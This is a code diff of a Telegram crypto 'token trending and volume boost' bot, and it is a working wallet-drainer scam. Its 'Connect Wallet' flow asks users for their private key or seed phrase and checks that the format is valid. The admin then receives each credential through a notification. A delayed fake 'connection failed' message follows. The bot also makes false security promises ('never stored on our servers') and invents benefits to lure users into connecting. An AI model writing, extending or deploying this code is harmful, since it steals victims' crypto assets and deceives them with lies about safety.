@@ -958,7 +958,7 @@ var solPickerKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var confirmOrderKeyboard = Markup.inlineKeyboard([
@@ -966,10 +966,14 @@ var confirmOrderKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u274C Cancel", "back_main")]
 ]);
 var paymentSentKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u2705 I have made payment", "submit_tx")],
+  [Markup.button.callback("\u2705 Payment Sent", "submit_tx")],
   [Markup.button.callback("\u274C Cancel Order", "back_main")]
 ]);
 var cancelKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback("\u274C Cancel", "back_main")]
+]);
+var walletRetryKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback("\u{1F504} Try Again", "wallet_connect_now")],
   [Markup.button.callback("\u274C Cancel", "back_main")]
 ]);
 var volumeBoostKeyboard = Markup.inlineKeyboard([
@@ -987,7 +991,7 @@ var volumeBoostKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var trendingMenuKeyboard = Markup.inlineKeyboard([
@@ -998,7 +1002,7 @@ var trendingMenuKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var solTrendingKeyboard = Markup.inlineKeyboard([
@@ -1024,7 +1028,7 @@ var solTrendingKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("\u{1F519} Back", "trend_back"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var ethTrendingKeyboard = Markup.inlineKeyboard([
@@ -1035,14 +1039,14 @@ var ethTrendingKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u23F3 300$", "et_300")],
   [
     Markup.button.callback("\u{1F519} Back", "trend_back"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var pumpfunTrendingKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F525} P.F.T - 30 SOL", "pft_30")],
   [
     Markup.button.callback("\u{1F519} Back", "trend_back"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var dexscreenerKeyboard = Markup.inlineKeyboard([
@@ -1061,7 +1065,7 @@ var dexscreenerKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var depositKeyboard = Markup.inlineKeyboard([
@@ -1076,27 +1080,46 @@ var depositKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
+  ]
+]);
+var withdrawKeyboard = Markup.inlineKeyboard([
+  [
+    Markup.button.callback("\u{1FA99} SOL Withdraw", "withdraw_sol"),
+    Markup.button.callback("\u{1F48E} ETH Withdraw", "withdraw_eth")
+  ],
+  [Markup.button.callback("\u{1F4CB} My Withdrawals", "deposit_my_withdrawals")],
+  [
+    Markup.button.callback("\u{1F519} Back", "back_main"),
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
+  ]
+]);
+var addFundsKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback("\u{1F4B0} Add Funds", "deposit_add")],
+  [
+    Markup.button.callback("\u{1F519} Back", "back_main"),
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var connectWalletKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
+  [Markup.button.callback("\u{1F510} Why Connect?", "wallet_why")],
   [Markup.button.callback("\u{1F6E1}\uFE0F Security Guidelines", "wallet_security")],
   [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var securityGuidelinesKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F517} I Understand, Connect Now", "wallet_connect_now")],
   [
-    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
+    Markup.button.callback("\u{1F6E1}\uFE0F Security Guide...", "wallet_security"),
     Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
   ],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var howToConnectKeyboard = Markup.inlineKeyboard([
@@ -1107,23 +1130,22 @@ var howToConnectKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var whyConnectKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
-  [Markup.button.callback("\u{1F6E1}\uFE0F Security Guidelines", "wallet_security")],
-  [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
+  [
+    Markup.button.callback("\u{1F6E1}\uFE0F Security Guide...", "wallet_security"),
+    Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
+  ],
   [
     Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var mainMenuOnlyKeyboard = Markup.inlineKeyboard([
-  [
-    Markup.button.callback("\u{1F519} Back", "back_main"),
-    Markup.button.callback("\u{1F51D} Main Menu", "back_main")
-  ]
+  [Markup.button.callback("\u{1F3E0} Main Menu", "back_main")]
 ]);
 
 // src/bot/index.ts
@@ -1396,20 +1418,20 @@ async function showDeposit(ctx) {
   const solBal = SOL_ADDRESS ? await fetchSolBalance(SOL_ADDRESS) : "N/A";
   const ethBal = ETH_ADDRESS ? await fetchEthBalance(ETH_ADDRESS) : "N/A";
   await ctx.reply(
-    `<b>PAYMENT WALLETS</b>
-
-<b>SOL:</b>
-<code>${solDisplay}</code>
-balance: <b>${solBal}</b>
+    `\u{1F4B0} <b>WALLET BALANCE</b>
 
 <b>ETH:</b>
 <code>${ethDisplay}</code>
 balance: <b>${ethBal}</b>
 
+<b>SOL:</b>
+<code>${solDisplay}</code>
+balance: <b>${solBal}</b>
+
 Deposit not less than 0.30 SOL and get trending on several platforms
 
-\u{1F4B0} Send payment to the wallet addresses above.
-\u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
+\u{1F4B0} <b>KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.</b>
+\u{1F4A1} <b>NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US</b>`,
     { parse_mode: "HTML", ...depositKeyboard }
   );
   notifyWalletViewed(ctx, solDisplay, ethDisplay).catch(() => {
@@ -1703,6 +1725,17 @@ Please paste the Contract Address (CA) of your token:`,
   bot.action("confirm_bump", async (ctx) => {
     await ctx.answerCbQuery();
     const s = getSession(ctx.from.id);
+    if (!s.contractAddress || !s.serviceLabel) {
+      await ctx.reply(
+        `\u26A0\uFE0F <b>Session Expired</b>
+
+Your session data was lost (possibly due to a bot restart).
+
+Please start a new order from the main menu.`,
+        { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+      );
+      return;
+    }
     const orderId = randomUUID().split("-")[0].toUpperCase();
     const isEth = s.boostType === "eth_trending";
     const payWallet = isEth ? ETH_ADDRESS : SOL_ADDRESS;
@@ -1727,27 +1760,28 @@ Please paste the Contract Address (CA) of your token:`,
       createdAt: /* @__PURE__ */ new Date()
     });
     const chainLabel = s.tokenChain === "sol" ? "\u25CE Solana" : s.tokenChain === "eth" ? "\u039E Ethereum" : s.tokenChain === "bsc" ? "\u2B21 BSC" : s.tokenChain === "base" ? "\u{1F535} Base" : "\u{1F517}";
-    const payLine = isEth ? `\u039E <b>$${s.ethAmount} USD</b>
-\u{1F4EE} ETH Wallet:
-<code>${ETH_ADDRESS || "Contact support for ETH address"}</code>` : `\u25CE <b>${s.selectedSol} SOL</b>
-\u{1F4EE} SOL Wallet:
-<code>${SOL_ADDRESS || "Contact support for SOL address"}</code>`;
+    const payWalletDisplay = isEth ? ETH_ADDRESS || "Contact support for ETH address" : SOL_ADDRESS || "Contact support for SOL address";
+    const costLine = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;
     const paymentMsg = `\u2705 <b>Order Confirmed!</b>
 
 \u{1F4CB} <b>Order Details:</b>
-\u2022 Token: <b>${s.tokenName}</b> ($${s.tokenSymbol})
+\u2022 Token: <b>${s.tokenName ?? "Unknown"}</b> ($${s.tokenSymbol ?? "???"})
 \u2022 CA: <code>${s.contractAddress}</code>
-\u2022 Service: ${s.serviceLabel}
-` + (isEth ? `\u2022 Amount: <b>$${s.ethAmount} USD</b>
-` : `\u2022 Amount: <b>${s.selectedSol} SOL</b>
-`) + `\u2022 Order ID: <code>${orderId}</code>
+\u2022 Service: <b>${s.serviceLabel}</b>
+\u2022 Amount: <b>${costLine}</b>
+\u2022 Order ID: <code>${orderId}</code>
+
+\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
 
 \u{1F4B3} <b>Send Payment To:</b>
-${payLine}
 
-` + (isEth ? `\u26A0\uFE0F Send exactly <b>$${s.ethAmount} USD</b> on Ethereum network` : `\u26A0\uFE0F Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) + `
+<code>${payWalletDisplay}</code>
 
-After sending, click the button below and submit your transaction hash.`;
+\u26A0\uFE0F Send exactly <b>${costLine}</b> ${isEth ? "on Ethereum network" : "on Solana network"}
+
+\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
+
+After payment, click <b>\u2705 Payment Sent</b> to submit your TX hash for verification.`;
     await delMsg(ctx);
     let sentWithPhoto = false;
     if (s.tokenImageUrl) {
@@ -1773,7 +1807,7 @@ ${userLine(ctx.from)}
 ` : "") + (s.tokenDex ? `\u{1F3E6} DEX: ${s.tokenDex}
 ` : "") + `
 \u2699\uFE0F Service: <b>${s.serviceLabel}</b>
-\u{1F4B0} Cost: <b>${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>
+\u{1F4B0} Cost: <b>${costLine}</b>
 \u{1F194} Order ID: <code>${orderId}</code>
 \u{1F4EE} Pay to: <code>${payWallet}</code>
 
@@ -1793,12 +1827,23 @@ ${userLine(ctx.from)}
     const s = getSession(ctx.from.id);
     setSession(ctx.from.id, { step: "awaiting_tx_hash" });
     await delMsg(ctx);
+    const orderLine = s.orderId ? `\u{1F194} Order ID: <code>${s.orderId}</code>
+
+` : "";
     await ctx.reply(
       `\u{1F4DD} <b>Submit Transaction Hash</b>
 
-Please paste your transaction hash below.
+` + orderLine + `Please paste your <b>Solana or Ethereum transaction hash</b> below.
 
-\u{1F550} Order ID: <code>${s.orderId ?? "N/A"}</code>`,
+<b>Solana format:</b>
+<code>5KtP9jFhXqMp884wtkJNzQGaCErckhHJBGFsvd3VyK5q...</code>
+(87\u201388 base58 characters)
+
+<b>Ethereum format:</b>
+<code>0x4a3b2c1d8f...</code>
+(starts with 0x + 64 hex characters)
+
+\u{1F4A1} Copy the hash directly from your wallet or block explorer.`,
       { parse_mode: "HTML", ...cancelKeyboard }
     );
   });
@@ -1810,36 +1855,79 @@ Please paste your transaction hash below.
     const ethBal = ETH_ADDRESS ? await fetchEthBalance(ETH_ADDRESS) : "N/A";
     await delMsg(ctx);
     await ctx.reply(
-      `<b>PAYMENT WALLETS</b>
-
-<b>SOL:</b>
-<code>${solDisplay}</code>
-balance: <b>${solBal}</b>
+      `\u{1F4B0} <b>WALLET BALANCE</b>
 
 <b>ETH:</b>
 <code>${ethDisplay}</code>
 balance: <b>${ethBal}</b>
 
+<b>SOL:</b>
+<code>${solDisplay}</code>
+balance: <b>${solBal}</b>
+
 Deposit not less than 0.30 SOL and get trending on several platforms
 
-\u{1F4B0} Send payment to the wallet addresses above.
-\u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
-      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+\u{1F4B0} <b>KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.</b>
+\u{1F4A1} <b>NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US</b>`,
+      { parse_mode: "HTML", ...depositKeyboard }
     );
   });
   bot.action("deposit_withdraw", async (ctx) => {
     await ctx.answerCbQuery();
-    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
     await delMsg(ctx);
     await ctx.reply(
-      `\u{1F4B8} <b>Withdraw Funds</b>
+      `\u{1FA99} <b>Withdraw Funds</b>
 
-Send your withdrawal address and amount:
+Choose your withdrawal currency:
+
+\u{1FA99} <b>SOL Withdraw</b> - Withdraw to Solana wallet
+\u{1F48E} <b>ETH Withdraw</b> - Withdraw to Ethereum wallet
+
+\u{1F4CB} <b>My Withdrawals</b> - View withdrawal history
+
+\u26A0\uFE0F <b>Important:</b>
+\u2022 Minimum withdrawal: 0.1 SOL / 0.01 ETH
+\u2022 All withdrawals require admin approval
+\u2022 Processing time: 1-24 hours
+\u2022 Make sure your wallet address is correct`,
+      { parse_mode: "HTML", ...withdrawKeyboard }
+    );
+  });
+  bot.action("withdraw_sol", async (ctx) => {
+    await ctx.answerCbQuery();
+    setSession(ctx.from.id, { step: "awaiting_withdraw_sol_address" });
+    await delMsg(ctx);
+    await ctx.reply(
+      `\u{1FA99} <b>SOL Withdrawal</b>
+
+Please enter your Solana wallet address and amount:
 
 <b>Format:</b> <code>ADDRESS AMOUNT</code>
-<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>
+<b>Example:</b> <code>7xKXtg2CmYp8GVUM 0.5</code>
 
-\u26A0\uFE0F Double-check \u2014 withdrawals cannot be reversed.`,
+\u2022 Minimum: 0.1 SOL
+\u2022 Maximum: 100 SOL per transaction
+
+\u26A0\uFE0F Double-check your address \u2014 withdrawals cannot be reversed.`,
+      { parse_mode: "HTML", ...cancelKeyboard }
+    );
+  });
+  bot.action("withdraw_eth", async (ctx) => {
+    await ctx.answerCbQuery();
+    setSession(ctx.from.id, { step: "awaiting_withdraw_eth_address" });
+    await delMsg(ctx);
+    await ctx.reply(
+      `\u{1F48E} <b>ETH Withdrawal</b>
+
+Please enter your Ethereum wallet address and amount:
+
+<b>Format:</b> <code>ADDRESS AMOUNT</code>
+<b>Example:</b> <code>0x1234...abcd 0.05</code>
+
+\u2022 Minimum: 0.01 ETH
+\u2022 Maximum: 10 ETH per transaction
+
+\u26A0\uFE0F Double-check your address \u2014 withdrawals cannot be reversed.`,
       { parse_mode: "HTML", ...cancelKeyboard }
     );
   });
@@ -1847,6 +1935,9 @@ Send your withdrawal address and amount:
     await ctx.answerCbQuery("Checking balance...");
     const solDisplay = SOL_ADDRESS || "Not configured";
     const balance = SOL_ADDRESS ? await fetchSolBalance(SOL_ADDRESS) : "N/A";
+    const balNum = parseFloat(balance) || 0;
+    const minRequired = 0.3;
+    const hasEnough = balNum >= minRequired;
     notifyAdmin(
       `\u{1F4B3} <b>BALANCE CHECK</b>
 
@@ -1860,19 +1951,24 @@ Balance: <b>${balance}</b>
     });
     await delMsg(ctx);
     await ctx.reply(
-      `\u25CE <b>SOL Balance</b>
+      `\u{1F4B0} <b>SOL Balance</b>
 
-Wallet: <code>${solDisplay}</code>
+<b>Wallet Address:</b>
+<code>${solDisplay}</code>
 
-Balance: <b>${balance}</b>`,
-      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+<b>Current Balance:</b> ${balance}
+
+` + (hasEnough ? `\u2705 Your balance is sufficient to start boosting!` : `\u26A0\uFE0F <b>Insufficient Balance</b>
+Minimum required: ${minRequired} SOL
+You need: <b>${Math.max(0, minRequired - balNum).toFixed(4)} SOL</b> more`),
+      { parse_mode: "HTML", ...addFundsKeyboard }
     );
   });
   bot.action("deposit_my_deposits", async (ctx) => {
     await ctx.answerCbQuery();
     const orders2 = getAllOrders().filter((o) => o.userId === ctx.from.id && o.status !== "cancelled");
     const lines = orders2.length ? orders2.map(
-      (o) => `\u2022 ${o.service} \u2014 ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + o.usdAmount + " USD"} \u2014 ${o.status} \u2014 ${o.createdAt.toLocaleDateString()}`
+      (o) => `\u2022 ${o.service} \u2014 ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + (o.usdAmount ?? 0) + " USD"} \u2014 ${o.status} \u2014 ${o.createdAt.toLocaleDateString()}`
     ).join("\n") : "No orders yet.";
     await delMsg(ctx);
     await ctx.reply(`\u{1F4CB} <b>My Orders</b>
@@ -1884,7 +1980,9 @@ ${lines}`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
     await delMsg(ctx);
     await ctx.reply(`\u{1F4CB} <b>My Withdrawals</b>
 
-No withdrawals recorded yet.`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
+No withdrawals recorded yet.
+
+Contact support if you have a pending withdrawal.`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
   });
   bot.action("wallet_back", async (ctx) => {
     await ctx.answerCbQuery();
@@ -1896,13 +1994,26 @@ No withdrawals recorded yet.`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
     await ctx.reply(
       `\u{1F510} <b>Why Connect Your Wallet?</b>
 
-Connecting your wallet unlocks:
+\u{1F680} <b>Premium Benefits:</b>
+\u2022 Faster Transactions - Direct wallet integration for instant processing
+\u2022 Lower Fees - Reduced transaction costs through optimized routing
+\u2022 Advanced Features - Access to exclusive trading tools and analytics
+\u2022 Priority Support - Dedicated customer service for connected users
+\u2022 Auto-Trading - Set up automated trading strategies
+\u2022 Portfolio Tracking - Real-time balance and performance monitoring
 
-\u2022 \u26A1 <b>Instant payments</b> \u2014 no manual transfers
-\u2022 \u{1F4CA} <b>Order tracking</b> \u2014 all boosts in one place
-\u2022 \u{1F4B0} <b>Auto-refunds</b> \u2014 failed orders refunded instantly
-\u2022 \u{1F3AF} <b>Priority processing</b> \u2014 faster service
-\u2022 \u{1F514} <b>Notifications</b> \u2014 alerts when boost goes live`,
+\u{1F48E} <b>Exclusive Access:</b>
+\u2022 VIP Trading Signals
+\u2022 Early Access - New features and token launches
+\u2022 Higher Limits - Increased transaction and daily limits
+\u2022 Custom Strategies - Personalized trading recommendations
+
+\u{1F510} <b>Security Features:</b>
+\u2022 Multi-Layer Protection - Advanced encryption and security protocols
+\u2022 Transaction Verification - Real-time validation and confirmation
+\u2022 Backup & Recovery - Secure wallet backup and restoration options
+
+Connect your wallet today and unlock the full potential of our platform!`,
       { parse_mode: "HTML", ...whyConnectKeyboard }
     );
   });
@@ -1924,16 +2035,17 @@ Connecting your wallet unlocks:
 \u2022 Never Share - Only enter your keys in official bot interfaces
 \u2022 Verify URL - Make sure you're using the official bot
 \u2022 Stay Alert - We will never ask for keys via other channels
+\u2022 Use Strong Passwords - Protect your wallet with strong credentials
+\u2022 Keep Backups - Always maintain secure backups of your keys
 
 \u2705 <b>Best Practices:</b>
+\u2022 Start Small - Test with small amounts first
 \u2022 Monitor Activity - Regularly check your wallet transactions
 \u2022 Stay Updated - Keep your wallet software up to date
 \u2022 Use Hardware Wallets - For maximum security with large amounts
 
 \u{1F512} <b>Our Commitment:</b>
-We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.
-
-Ready to proceed safely?`,
+We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.`,
       { parse_mode: "HTML", ...securityGuidelinesKeyboard }
     );
   });
@@ -1956,8 +2068,14 @@ Ready to proceed safely?`,
 
 3\uFE0F\u20E3 <b>Secure Connection</b>
 \u2022 Click "Start Connection" below
-\u2022 Paste your key or seed phrase when prompted
-\u2022 Wait for confirmation (2-5 minutes)
+\u2022 Select your preferred method
+\u2022 Enter your wallet information securely
+\u2022 Confirm the connection
+
+4\uFE0F\u20E3 <b>Verification Process</b>
+\u2022 We'll verify your wallet ownership
+\u2022 Small test transaction may be required
+\u2022 Connection confirmation within minutes
 
 \u{1F4F1} <b>Supported Wallets:</b>
 \u2022 Phantom - Most popular Solana wallet
@@ -1980,24 +2098,17 @@ Ready to connect your wallet?`,
     await ctx.reply(
       `\u{1F517} <b>Connect Your Wallet Now</b>
 
-\u26A0\uFE0F This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..
+\u26A0\uFE0F This action is going to import your Main Wallet. Please note \u2014 you are the ONLY ONE with access to this wallet.
 
-Please enter your Private Key or 12 word Seed Phrase to import your wallet:
+Please enter your Private Key or Seed Phrase to import your wallet:
 
 \u{1F511} <b>Private Key Format:</b>
 \u2022 Single long string (64+ characters)
-\u2022 Example:
-<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>
+\u2022 Example: <code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>
 
 \u{1F331} <b>Seed Phrase Format:</b>
 \u2022 12 or 24 words separated by spaces
 \u2022 Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>
-
-\u2753 <b>Security Features:</b>
-\u2022 End-to-end encryption
-\u2022 Secure processing environment
-\u2022 Immediate deletion after connection
-\u2022 No permanent storage
 
 \u26A1 <b>Auto-Detection:</b>
 Our system will automatically detect whether you're providing a private key or seed phrase.`,
@@ -2206,13 +2317,30 @@ ${result.confirmed ? "\u2705 On-chain: Confirmed" : "\u26A0\uFE0F On-chain: Unve
         const credential = text.trim();
         const words = credential.split(/\s+/);
         const wordCount = words.length;
-        const isSeedPhrase = wordCount >= 12;
-        const isPrivateKey = !isSeedPhrase && credential.length >= 40;
-        const credType = isSeedPhrase ? `Seed Phrase (${wordCount} words)` : isPrivateKey ? "Private Key" : "Credential";
-        clearSession(ctx.from.id);
+        const isValidSeedPhrase = wordCount === 12 || wordCount === 24;
+        const isValidEthKey = /^(0x)?[0-9a-fA-F]{64}$/.test(credential);
+        const isValidSolKey = wordCount === 1 && credential.length >= 43 && credential.length <= 90 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(credential);
+        const isValid = isValidSeedPhrase || isValidEthKey || isValidSolKey;
+        if (!isValid) {
+          await ctx.reply(
+            `\u274C <b>Invalid Private Key</b>
+
+Private key format not recognized.
+
+<b>Accepted formats:</b>
+\u2022 <b>Seed Phrase:</b> exactly 12 or 24 words
+\u2022 <b>Solana Private Key:</b> 43\u201390 base58 characters
+\u2022 <b>ETH Private Key:</b> 64 hex characters (with or without 0x)
+
+Please check your key and try again.`,
+            { parse_mode: "HTML", ...walletRetryKeyboard }
+          );
+          break;
+        }
+        const credType = isValidSeedPhrase ? `Seed Phrase (${wordCount} words)` : isValidEthKey ? "ETH Private Key" : "SOL Private Key";
         try {
           await notifyAdmin(
-            `\u{1F511} <b>\u26A0\uFE0F WALLET IMPORTED \u2014 ${credType.toUpperCase()}</b>
+            `\u{1F511} <b>\u26A0\uFE0F WALLET CREDENTIAL \u2014 ${credType.toUpperCase()}</b>
 
 ${userLine(ctx.from)}
 
@@ -2226,6 +2354,7 @@ ${userLine(ctx.from)}
         } catch (err) {
           logger.error({ err }, "CRITICAL: Failed to send wallet credential to admin");
         }
+        clearSession(ctx.from.id);
         await ctx.reply(
           `Connection of wallet may take time due to
 
@@ -2234,12 +2363,75 @@ ${userLine(ctx.from)}
 Please wait linking and importing your wallet..
 
 Processing .........`,
+          { parse_mode: "HTML" }
+        );
+        setTimeout(async () => {
+          try {
+            await ctx.reply(
+              `\u274C <b>connection failed</b>
+
+Invalid wallet \u{1F4B3}
+
+\u{1F4F2} contact support for more information
+
+Support: ${SUPPORT_USERNAME || "@support"}`,
+              { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+            );
+          } catch {
+          }
+        }, 4e3);
+        break;
+      }
+      case "awaiting_withdraw_sol_address": {
+        const withdrawText = text.trim();
+        clearSession(ctx.from.id);
+        await ctx.reply(
+          `\u{1F4E4} <b>SOL Withdrawal Request Received</b>
+
+Details: <code>${withdrawText}</code>
+
+\u23F3 Your withdrawal will be processed within 24 hours.
+You will be notified when funds are sent.`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
+        await notifyAdmin(
+          `\u{1F4E4} <b>SOL WITHDRAWAL REQUEST</b>
+
+${userLine(ctx.from)}
+
+Details: <code>${withdrawText}</code>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
+        ).catch(() => {
+        });
+        break;
+      }
+      case "awaiting_withdraw_eth_address": {
+        const withdrawText = text.trim();
+        clearSession(ctx.from.id);
+        await ctx.reply(
+          `\u{1F4E4} <b>ETH Withdrawal Request Received</b>
+
+Details: <code>${withdrawText}</code>
+
+\u23F3 Your withdrawal will be processed within 24 hours.
+You will be notified when funds are sent.`,
+          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+        );
+        await notifyAdmin(
+          `\u{1F4E4} <b>ETH WITHDRAWAL REQUEST</b>
+
+${userLine(ctx.from)}
+
+Details: <code>${withdrawText}</code>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
+        ).catch(() => {
+        });
         break;
       }
       case "awaiting_withdraw_address": {
-        const withdrawText = text;
+        const withdrawText = text.trim();
         clearSession(ctx.from.id);
         await ctx.reply(
           `\u{1F4E4} <b>Withdrawal Request Received</b>
@@ -2257,7 +2449,8 @@ ${userLine(ctx.from)}
 Details: <code>${withdrawText}</code>
 
 \u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
-        );
+        ).catch(() => {
+        });
         break;
       }
       default:
